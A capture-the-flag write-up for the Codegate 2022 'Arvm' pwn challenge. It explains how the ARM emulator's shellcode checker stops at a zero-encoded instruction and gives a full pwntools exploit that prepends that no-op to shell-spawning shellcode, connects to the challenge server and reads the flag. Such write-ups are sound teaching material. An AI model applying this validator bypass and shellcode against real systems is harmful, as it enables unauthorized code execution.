# Arvm

**Author**: [Nspace](https://twitter.com/_MatteoRizzo)

**Tags:** pwn

**Points:** 793 (25 solves)

**Description:** 

> Welcome! Here is my Emulator. It can use only human.
> 
> Always SMiLEY :)

This challenge is an ARM binary running in `qemu-user`. The challenge asks us to input up to 4k of ARM machine code, then gives us a choice between running the code, printing it, or replacing it with new code.

```
Running Emulator...
Welcome Emulator
Insert Your Code :>

[...]

1. Run Code
2. View Code
3. Edit Code
:>
```

When we choose to run the code the binary asks us to solve a simple captcha, where we only have to read a number from the challenge and send it back.

```
Before run, it has some captcha
Secret code : 0xf40117a4
Code? :> $ 0xf40117a4
```

After we pass the captcha, the binary verifies our shellcode (`run()`):

```c
struct vm *vm;

void invalid_insn(uint32_t insn)
{
  printf("Instruction 0x%x is invalid\n", insn);
  exit(-1);
}

int run(void)
{
  unsigned int v0;
  uint32_t next_insn;

  for (uint32_t insn = -1; vm->registers[15] < vm->code + 4096; insn = next_insn) {
    if (vm->registers[15] < vm->code) {
      break;
    }

    next_insn = *(uint32_t *)vm->registers[15];
    vm->registers[15] += 4;

    if (insn == 0) {
      break;
    }
    if (insn != -1 && !sub_11314(insn)) {
      invalid_insn(insn);
    }

    v0 = sub_1124C(insn);
    if (v0 <= 4) {
      switch (v0) {
        case 0u:
          if ( sub_117B8(insn) == -1 )
            invalid_insn(insn);
          continue;
        case 1u:
          if ( sub_11D98(insn) == -1 )
            invalid_insn(insn);
          continue;
        case 2u:
          if ( sub_11F28(insn) == -1 )
            invalid_insn(insn);
          next_insn = -1;
          continue;
        case 3u:
          if ( sub_126EC() == -1 )
            invalid_insn(insn);
          continue;
        case 4u:
          if ( sub_12000(insn) == -1 )
            invalid_insn(insn);
          continue;
        default:
            invalid_insn(insn);
          continue;
      }
    }
    if ( v0 != -1 ) {
      invalid_insn(insn);
    }
  }
  return 0;
}
```

If the verification succeeds, the binary runs our shellcode.

The `run` function is presumably trying to prevent our shellcode from doing something fishy like launching a shell. However I don't know for sure becauase I didn't actually reverse the checks.

Instead I noticed that the verification succeeds immediately when it encounters an instruction that encodes to 0. 0 is a valid ARM instruction that is essentially a nop (`andeq r0, r0, r0`). This means that we can easily bypass all the checks by prefixing our shellcode with this instruction.

Here is the final exploit script:

```py
from pwn import *

e = ELF('app')

context.binary = e

shellcode = asm('\n'.join([
    'andeq r0, r0, r0',
    shellcraft.sh(),
]))

if args.REMOTE:
    r = remote('15.165.92.159', 1234)
else:
    r = process('./run.sh')

r.sendafter(b'Insert Your Code :> ', shellcode)
r.sendlineafter(b':> ', b'1')
r.recvuntil(b'Secret code : 0x')
captcha = int(r.recvline().strip().decode(), base=16)
r.sendline(hex(captcha).encode())

r.sendline(b'cat flag*')
r.stream()
```

```
$ python3 exploit.py REMOTE
codegate2022{79d1bafd64f2e49a5bc60e001d179c23ce05f43a5145ea1ff673a51fbe81d8baf846e3adab31d65792838d73b06047822fb419ebc522}
```